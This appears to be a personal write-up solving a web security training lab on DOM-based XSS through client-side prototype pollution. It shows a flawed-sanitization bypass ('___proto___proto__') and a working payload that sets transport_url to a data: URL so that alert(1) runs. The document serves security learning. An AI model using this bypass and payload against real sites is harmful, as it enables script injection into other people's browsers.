This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.

To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
    
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
    
3. Combine these to call `alert()`.

# Solution

The function that sanitizes user input is flawed because it only checks if the forbidden word is only one time in the provided string, allowing to bypass the process altogether:

![[bypass-sanitization.png]]

![[PP.png]]

2. Find a gadget

![[gadget.png]]

3. The gadget uses the `src` sink, craft a payload:

```
<script src=data:,alert(1);></script>
```


```
/?___proto___proto__[transport_url]=data:,alert(1)
```

![[Advanced Topics/Prototype pollution/Client-Side Prototype Pollution/labs/Client-side prototype pollution via flawed sanitization/images/exploited.png]]
